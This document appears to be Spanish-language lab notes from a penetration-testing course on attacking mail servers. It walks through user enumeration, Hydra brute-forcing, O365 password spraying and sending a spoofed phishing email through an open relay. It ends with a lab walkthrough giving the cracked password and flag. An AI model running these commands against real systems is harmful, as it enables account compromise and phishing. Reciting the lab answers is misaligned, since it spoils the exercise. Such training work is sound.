Un "mail server" maneja y reparte emails sobre una red. 
Un mail server puede recibir emails de un cliente y enviarlos a otro mail server o, también puede entregar dichos emails a otro cliente. 
Entendemos por cliente a aquel que quiera leer emails. 

En el momento de enviar un email, se establece una conexión SMTP a un servidor de internet. (SMTP = single mail transfer protocol).

Cuando nos descargamos un email, nuestra aplicación de emails se conectará por POP3 o por IMAP4 al servidor de internet, el cual le servirá el email.

Por defecto, el protocolo POP3 elimina los mensajes descargados del servidor de email. Esto dificulta que un mismo email se puede ejecutar desde varios dispositivos.  Aun así, POP3 también admite copia de los mensajes descargados en el propio email.

Por otro lado, el protocolo IMAP4 nunca elimina los mensajes descargador del servidor.  Esto hace que sea mucho más fácil descargar emails desde múltiples dispositivos. 

![[SMTP-IMAP-1.webp]]

---

Podemos utilizar la herramienta Mail eXchanger (MX) para identificar los registros DNS de un servidor de internet. 
El MX record especifica el email server responsable de aceptar entradas de mensajes de un dominio concreto. 


### Host - MX Records

El siguiente comando pregunta al sistema de nombres de dominio (DNS) qué servidor(es) de correo recibe(n) el correo para hackthebox.eu.
```shell-session
Polika4RM@htb[/htb]$ host -t MX hackthebox.eu

hackthebox.eu mail is handled by 1 aspmx.l.google.com.
```

#### DIG - MX Records
El siguiente comando ejecuta una consulta DNS para obtener los registros MX del dominio "plaintext.do".


```shell-session
Polika4RM@htb[/htb]$ dig mx plaintext.do | grep "MX" | grep -v ";"

plaintext.do.           7076    IN      MX      50 mx3.zoho.com.
plaintext.do.           7076    IN      MX      10 mx.zoho.com.
plaintext.do.           7076    IN      MX      20 mx2.zoho.com.
```

Esto te devuelve los servidores de correo (mx3...  mx....  mx2 ....) que aceptan correo para plaintext.do.

### Host - A Records

El siguiente comando pregunta a un servidor DNS por el registro A del nombre mail1.inlanefreight.htb (el registro A asocio un nombre de Host con una dirección IPv4):
```shell-session
Polika4RM@htb[/htb]$ host -t A mail1.inlanefreight.htb.

mail1.inlanefreight.htb has address 10.129.14.128
```

"mail1.inlanefreight.htb" :
	- mail1: es el nombre de la máquina o servicio
	- inlanefreight.htb es el dominio

---

Estos MX records indican que los comandos ejecutados anteriormente utilizan "mail services" como :
- G-Suite
- Microsoft 365
- Zoho

Si estamos atacando un mail server como inlanefreight.htb, podemos enumerar los siguientes puertos:

|Puerto|Servicio|
|---|---|
|TCP/25|SMTP — sin cifrar|
|TCP/143|IMAP4 — sin cifrar|
|TCP/110|POP3 — sin cifrar|
|TCP/465|SMTP — cifrado (SMTPS)|
|TCP/587|SMTP — cifrado / STARTTLS (envío de correo autenticado)|
|TCP/993|IMAP4 — cifrado (IMAPS)|
|TCP/995|POP3 — cifrado (POP3S)|

---

# Malas configuraciones
Puede darse el caso que el servidor de correos admita una autenticación "anónima" la cual pueda numerar usuarios válidos. 

Para numerar, existen varios comandos que podemos utilizar, tales como:
- VRFY
- EXPN
- RCPT TO

Nos conectamos a un mail server con:
```
telnet 10.10.110.20 25
```


### VRFY
y podemos ejecutar el comando "VRFY", el cual nos devolverá un identificador de usuario en caso de que exista:

```shell-session
Polika4RM@htb[/htb]$ telnet 10.10.110.20 25

Trying 10.10.110.20...
Connected to 10.10.110.20.
Escape character is '^]'.
220 parrot ESMTP Postfix (Debian/GNU)


VRFY root

252 2.0.0 root


VRFY www-data

252 2.0.0 www-data


VRFY new-user

550 5.1.1 <new-user>: Recipient address rejected: User unknown in local recipient table
```


### RCPT TO Command

1. Me autentico (telnet <ip_servidor>)
2. Genero un email de prueba: MAIL FROM: test@htb.com
3. Comienzo a probar usuarios: 
	1. RCPT TO:<nombre_usuario>.
	   En caso de que el usuario exista, el servidor nos lo confiramará.
	   Pongo solo el nombre de usuario y no el email entero porque el propio mail server ya asocia dicho nombre a <nombre_usuario>@dominio_local_servidor. En caso de que un servidor tenga diferentes dominios, por defecto cogerá el que tenga configurado como primera opción:

```shell-session
Polika4RM@htb[/htb]$ telnet 10.10.110.20 25

Trying 10.10.110.20...
Connected to 10.10.110.20.
Escape character is '^]'.
220 parrot ESMTP Postfix (Debian/GNU)


MAIL FROM:test@htb.com
it is
250 2.1.0 test@htb.com... Sender ok


RCPT TO:julio

550 5.1.1 julio... User unknown


RCPT TO:kate

550 5.1.1 kate... User unknown


RCPT TO:john

250 2.1.5 john... Recipient ok
```

### Comando USER
Podemos también utilizar en protocolo POP3 el conjunto de usuarios existentes en un mail server. 
Utilizaremos el comando "USER" seguido del nombre del usuario. En caso de que exista nos devolverá un "ok":
```shell-session
Polika4RM@htb[/htb]$ telnet 10.10.110.20 110

Trying 10.10.110.20...
Connected to 10.10.110.20.
Escape character is '^]'.
+OK POP3 Server ready

USER julio

-ERR


USER john

+OK
```

Podemos automatizar este proceso con smtp-user-enum.
	Podemos especificar el modo de enumeración con "-M" seguido de:
		"VRFY": verifica que exista dicho usuario
		"EXPN": Sirve para pedir al servidor que muestre todos los miembros de una lista o alias.
		"RCPT": Probar si un destinatario es válido durante el envío


Lo haremos con el comando:
```shell-session
Polika4RM@htb[/htb]$ smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7

Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Mode ..................... RCPT
Worker Processes ......... 5
Usernames file ........... userlist.txt
Target count ............. 1
Username count ........... 78
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............ inlanefreight.htb

######## Scan started at Thu Apr 21 06:53:07 2022 #########
10.129.203.7: jose@inlanefreight.htb exists
10.129.203.7: pedro@inlanefreight.htb exists
10.129.203.7: kate@inlanefreight.htb exists
######## Scan completed at Thu Apr 21 06:53:18 2022 #########
3 results.

78 queries in 11 seconds (7.1 queries / sec)
```

---

# Cloud Enumeration
Los proveedores de correo en la nube (Google Workspace, Office 365, Zoho, etc.) usan implementaciones propias y funcionalidades específicas que pueden tanto dificultar como ofrecer vectores de enumeración (por ejemplo, endpoints web, APIs, flujos OAuth).
Por eso las técnicas para enumerar usuarios o realizar password spraying varían según el proveedor y no siempre funcionan las técnicas SMTP/POP/IMAP clásicas:

Office 365 (O365) es un buen ejemplo: tiene mecanismos y endpoints concretos que pueden explotarse para enumerar cuentas o para password spraying si no está bien protegido.

### O365 Spray

La herramienta o365spray.py nos puede ayudar.

Primero de todo, validamos que tal dominio utilice la tecnología de Microsoft Office 365:
```shell-session
Polika4RM@htb[/htb]$ python3 o365spray.py --validate --domain msplaintext.xyz

            *** O365 Spray ***            

>----------------------------------------<

   > version        :  2.0.4
   > domain         :  msplaintext.xyz
   > validate       :  True
   > timeout        :  25 seconds
   > start          :  2022-04-13 09:46:40

>----------------------------------------<

[2022-04-13 09:46:40,344] INFO : Running O365 validation for: msplaintext.xyz
[2022-04-13 09:46:40,743] INFO : [VALID] The following domain is using O365: msplaintext.xyz
```

Entonces, haremos un ataque spray de usuarios con:
```shell-session
Polika4RM@htb[/htb]$ python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz        
                                       
            *** O365 Spray ***             

>----------------------------------------<

   > version        :  2.0.4
   > domain         :  msplaintext.xyz
   > enum           :  True
   > userfile       :  users.txt
   > enum_module    :  office
   > rate           :  10 threads
   > timeout        :  25 seconds
   > start          :  2022-04-13 09:48:03

>----------------------------------------<

[2022-04-13 09:48:03,621] INFO : Running O365 validation for: msplaintext.xyz
[2022-04-13 09:48:04,062] INFO : [VALID] The following domain is using O365: msplaintext.xyz
[2022-04-13 09:48:04,064] INFO : Running user enumeration against 67 potential users
[2022-04-13 09:48:08,244] INFO : [VALID] lewen@msplaintext.xyz
[2022-04-13 09:48:10,415] INFO : [VALID] juurena@msplaintext.xyz
[2022-04-13 09:48:10,415] INFO : 

[ * ] Valid accounts can be found at: '/opt/o365spray/enum/enum_valid_accounts.2204130948.txt'
[ * ] All enumerated accounts can be found at: '/opt/o365spray/enum/enum_tested_accounts.2204130948.txt'

[2022-04-13 09:48:10,416] INFO : Valid Accounts: 2
```

---

### HYDRA para ataques de contraseñas
Podemos utilizar Hydra para realizar un ataque de fuerza bruta contra las credenciales de un email server que utilice SMTP, POP3 o IMAP4.

Para encontrar usuarios y contraseñas válidas en un mail server, ejecutaré:
```shell-session
Polika4RM@htb[/htb]$ hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-04-13 11:37:46
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[DATA] max 16 tasks per 1 server, overall 16 tasks, 67 login tries (l:67/p:1), ~5 tries per task
[DATA] attacking pop3://10.10.110.20:110/
[110][pop3] host: 10.129.42.197   login: john   password: Company01!
1 of 1 target successfully completed, 1 valid password found
```

### O365 Spray  para ataques de contraseñas
En caso de que el comando anterior falle, también podemos utiliar O365spray:
```shell-session
Polika4RM@htb[/htb]$ python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz

            *** O365 Spray ***            

>----------------------------------------<

   > version        :  2.0.4
   > domain         :  msplaintext.xyz
   > spray          :  True
   > password       :  March2022!
   > userfile       :  usersfound.txt
   > count          :  1 passwords/spray
   > lockout        :  1.0 minutes
   > spray_module   :  oauth2
   > rate           :  10 threads
   > safe           :  10 locked accounts
   > timeout        :  25 seconds
   > start          :  2022-04-14 12:26:31

>----------------------------------------<

[2022-04-14 12:26:31,757] INFO : Running O365 validation for: msplaintext.xyz
[2022-04-14 12:26:32,201] INFO : [VALID] The following domain is using O365: msplaintext.xyz
[2022-04-14 12:26:32,202] INFO : Running password spray against 2 users.
[2022-04-14 12:26:32,202] INFO : Password spraying the following passwords: ['March2022!']
[2022-04-14 12:26:33,025] INFO : [VALID] lewen@msplaintext.xyz:March2022!
[2022-04-14 12:26:33,048] INFO : 

[ * ] Writing valid credentials to: '/opt/o365spray/spray/spray_valid_credentials.2204141226.txt'
[ * ] All sprayed credentials can be found at: '/opt/o365spray/spray/spray_tested_credentials.2204141226.txt'

[2022-04-14 12:26:33,048] INFO : Valid Credentials: 1
```

---

## Ataques específicos del protocolo
Un open relay es un servidor SMTP que está mal configurado y acepta reenviar (relay) correo de cualquier remitente a cualquier destinatario sin pedir autenticación ni verificar que el remitente pertenece a su dominio.
En otras palabras: cualquiera puede usar ese servidor para enviar correos desde cualquier dirección hacia cualquier destino.

Oculta el origen del correo. Si yo uso un open relay para enviar from: ceo@empresa.com a empleado@empresa.com, el correo parece venir del servidor relay, no de mi equipo.
Facilita el phishing y el spam. Los atacantes pueden enviar grandes volúmenes de correos fraudulentos (phishing/spam) que aparentan venir de la organización objetivo.
Si un servidor actúa como relay abierto, su IP puede terminar en listas negras (blacklists), perjudicando la entrega legítima de correo de la organización.

nmap nos puede decir si tal servidor presenta dicha vulnerabilidad:
```shell-session
Polika4RM@htb[/htb]# nmap -p25 -Pn --script smtp-open-relay 10.10.11.213

Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-28 23:59 EDT
Nmap scan report for 10.10.11.213
Host is up (0.28s latency).

PORT   STATE SERVICE
25/tcp open  smtp
|_smtp-open-relay: Server is an open relay (14/16 tests)
```

Y podremos conectarnos haciendo uso de:

```shell-session
Polika4RM@htb[/htb]# swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Company Notification' --body 'Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/' --server 10.10.11.213

=== Trying 10.10.11.213:25...
=== Connected to 10.10.11.213.
<-  220 mail.localdomain SMTP Mailer ready
 -> EHLO parrot
<-  250-mail.localdomain
<-  250-SIZE 33554432
<-  250-8BITMIME
<-  250-STARTTLS
<-  250-AUTH LOGIN PLAIN CRAM-MD5 CRAM-SHA1
<-  250 HELP
 -> MAIL FROM:<notifications@inlanefreight.com>
<-  250 OK
 -> RCPT TO:<employees@inlanefreight.com>
<-  250 OK
 -> DATA
<-  354 End data with <CR><LF>.<CR><LF>
 -> Date: Thu, 29 Oct 2020 01:36:06 -0400
 -> To: employees@inlanefreight.com
 -> From: notifications@inlanefreight.com
 -> Subject: Company Notification
 -> Message-Id: <20201029013606.775675@parrot>
 -> X-Mailer: swaks v20190914.0 jetmore.org/john/code/swaks/
 -> 
 -> Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/
 -> 
 -> 
 -> .
<-  250 OK
 -> QUIT
<-  221 Bye
=== Connection closed with remote host.
```

- `swaks ... --server 10.10.11.213` → se usa **swaks** (herramienta para enviar/depurar SMTP) para conectarse al servidor SMTP en `10.10.11.213` y enviar un correo desde `notifications@inlanefreight.com` a `employees@inlanefreight.com` con asunto y cuerpo dados.
    
- `Connected` / `220 mail.localdomain SMTP Mailer ready` → el servidor responde que está listo (código **220**).
    
- `EHLO parrot` → el cliente se presenta; el servidor responde con sus capacidades: `SIZE`, `8BITMIME`, **STARTTLS** (soporta elevar a TLS), `AUTH LOGIN PLAIN ...` (soporta autenticación).
    
- `MAIL FROM:<notifications@...>` → declara el remitente; servidor responde `250 OK` (acepta el remitente).
    
- `RCPT TO:<employees@...>` → declara el destinatario; responde `250 OK` (acepta el destinatario).
    
- `DATA` → comienza a enviar el contenido del mensaje; el servidor responde `354` indicando “envía los datos y finaliza con una línea con solo `.`”.
    
- Se envían los headers (`Date`, `To`, `From`, `Subject`, `Message-Id`, `X-Mailer`) y el body con el enlace `http://mycustomphishinglink.com/`. La transferencia se cierra con `.` en una línea separada.
    
- `250 OK` → el servidor aceptó y encoló/entregó el mensaje.
    
- `QUIT` → termina la sesión; `221 Bye` confirma el cierre.



---
**Target:10.129.203.12**
**1. What is the available username for the domain inlanefreight.htb in the SMTP server?**
Ejecutamos un escaneo básico en nmap:

```
nmap -sCV -Pn -n --open --min-rate 2000 10.129.203.12
```

Y nos devuelve como efectivamente estamos ante un email server:
```
PORT     STATE SERVICE       VERSION
25/tcp   open  smtp          hMailServer smtpd
| smtp-commands: WIN-02, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
110/tcp  open  pop3          hMailServer pop3d
|_pop3-capabilities: TOP USER UIDL
143/tcp  open  imap          hMailServer imapd
|_imap-capabilities: IMAP4rev1 IMAP4 ACL CAPABILITY completed OK RIGHTS=texkA0001 SORT QUOTA NAMESPACE CHILDREN IDLE
```


Añado al /etc/hosts:
```
10.129.203.12 inlanefreight.htb
```

Me descargo los recursos que la academia ofrece (usernames.list).
Ejecuto una enumeración de usernames con:
```
smtp-user-enum -M VRFY -U usernames.list -D inlanefreight.htb -t 10.129.203.12
```

Y encuentro:
```
smtp-user-enum -M RCPT -U usernames.list -D inlanefreight.htb -t 10.129.203.12
Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Mode ..................... RCPT
Worker Processes ......... 5
Usernames file ........... usernames.list
Target count ............. 1
Username count ........... 79
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............ inlanefreight.htb

######## Scan started at Mon Oct 20 09:43:18 2025 #########
10.129.203.12: marlin@inlanefreight.htb exists
######## Scan completed at Mon Oct 20 09:43:20 2025 #########
1 results.

79 queries in 2 seconds (39.5 queries / sec)

```
Y encuentro la respuesta: marlin

**2. Access the email account using the user credentials that you discovered and submit the flag in the email as your answer.**

Me descargo de los recursos de HTB "passwords.list".

Ejecuto fuerza bruta con Hydra: 
```
hydra -l "marlin@inlanefreight.htb" -P passwords.list -f 10.129.203.12 pop3
```

Y me devuelve como credencial válida: 
```
hydra -l "marlin@inlanefreight.htb" -P passwords.list -f 10.129.203.12 pop3
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-10-20 10:05:25
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[DATA] max 16 tasks per 1 server, overall 16 tasks, 333 login tries (l:1/p:333), ~21 tries per task
[DATA] attacking pop3://10.129.49.217:110/
[110][pop3] host: 10.129.49.217   login: marlin@inlanefreight.htb   password: poohbear
[STATUS] attack finished for 10.129.49.217 (valid pair found)
1 of 1 target successfully completed, 1 valid password found

```
Siendo la credencial: "poohbear"
Me conecto a dicho servidor con:
```
telnet $ip 110  

USER marlin@inlanefreight.htb  

PASS poohbear  

  
LIST  
  
RETR 1

hydra -l "marlin@inlanefreight.htb" -P passwords.list -f  pop3
```

Viendo el texto:
```
Hi admin,  
  
How can I change my password to something more secure?  
  
flag: HTB{w34k_p4$$w0rd}
```

